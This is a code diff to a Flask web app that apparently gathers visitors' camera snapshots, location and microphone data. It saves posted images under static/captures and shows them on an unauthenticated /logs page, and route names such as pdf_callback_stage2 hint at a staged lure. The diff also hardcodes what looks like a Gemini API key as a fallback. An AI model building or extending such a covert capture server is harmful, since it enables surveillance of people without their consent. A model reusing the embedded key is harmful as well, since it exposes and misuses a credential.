@@ -21,7 +21,7 @@ import glob
 
 # Configure the SDK with your Gemini API key
 genai.configure(api_key=os.environ.get("GEMINI_API_KEY", "AIzaSyAt-7tA0Ah0cRJrarXMOY4DTPBbzBbASyU"))
-
+os.makedirs('static/captures', exist_ok=True)
 app = Flask(__name__)
 app.secret_key = os.urandom(24)  # For session management
 
@@ -575,18 +575,24 @@ def pdf_callback_stage2():
 
 @app.route('/logs')
 def display_logs():
+    """Route to display logs, reports, and captured images."""
+    # Read log file content
     try:
         with open('user_logs.log', 'r') as f:
             logs_content = f.read()
     except Exception as e:
         logs_content = f"Error reading log file: {e}"
 
-    # Get list of captured images
-    captures = glob.glob('static/captures/*.jpg')
-    captures_html = ""
-    for capture in captures:
-        captures_html += f'<img src="/{capture}" alt="Captured Image" style="max-width: 300px; margin: 10px;">'
+    # Get list of captured images using pathlib
+    captures_dir = Path('static/captures')
+    try:
+        captures = [p for p in captures_dir.iterdir() if p.is_file() and p.suffix == '.jpg']
+        captures.sort(key=lambda p: p.stat().st_mtime, reverse=True)  # Sort by modification time, newest first
+        captures = [str(p) for p in captures]  # Convert Path objects to strings
+    except FileNotFoundError:
+        captures = []  # Handle case where directory doesn't exist
 
+    # HTML template for logs page
     logs_html = """
     <!DOCTYPE html>
     <html>
@@ -625,12 +631,20 @@ def display_logs():
             <p>No reports available.</p>
             {% endif %}
             <h2>Captured Images</h2>
-            <div>{{ captures_html | safe }}</div>
+            <div>
+                {% if captures %}
+                    {% for capture in captures %}
+                        <img src="/{{ capture }}" alt="Captured Image" style="max-width: 300px; margin: 10px;">
+                    {% endfor %}
+                {% else %}
+                    <p>No images captured yet.</p>
+                {% endif %}
+            </div>
         </div>
     </body>
     </html>
     """
-    return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports, captures_html=captures_html)
+    return render_template_string(logs_html, logs=logs_content, reports=downloaded_reports, captures=captures)
 
 @app.route('/log_location', methods=['POST'])
 def log_location():
@@ -640,20 +654,27 @@ def log_location():
 
 @app.route('/log_camera', methods=['POST'])
 def log_camera():
-    data = request.json
-    snapshot = data.get('snapshot')
-    if snapshot:
-        # Decode base64 image
-        image_data = base64.b64decode(snapshot.split(',')[1])
-        # Generate unique filename
+    """Route to capture and save an image from the camera."""
+    try:
+        data = request.get_json()
+        image_data = data.get('image')
+        if not image_data:
+            return {'status': 'error', 'message': 'No image data provided'}, 400
+
+        # Decode base64 image (assuming it's sent as data:image/jpeg;base64,...)
+        image_data = image_data.split(',')[1]  # Remove data URI prefix
+        image_bytes = base64.b64decode(image_data)
+        
+        # Save the image with a unique filename
         filename = f"static/captures/{uuid.uuid4()}.jpg"
-        # Ensure directory exists
-        os.makedirs('static/captures', exist_ok=True)
-        # Save image
         with open(filename, 'wb') as f:
-            f.write(image_data)
-        logging.info(f"Camera snapshot saved: {filename}")
-    return "Camera logged", 200
+            f.write(image_bytes)
+        
+        logging.info(f"Image captured and saved as {filename}")
+        return {'status': 'success', 'filename': filename}, 200
+    except Exception as e:
+        logging.error(f"Error in log_camera: {e}")
+        return {'status': 'error', 'message': str(e)}, 500
 
 @app.route('/log_microphone', methods=['POST'])
 def log_microphone():
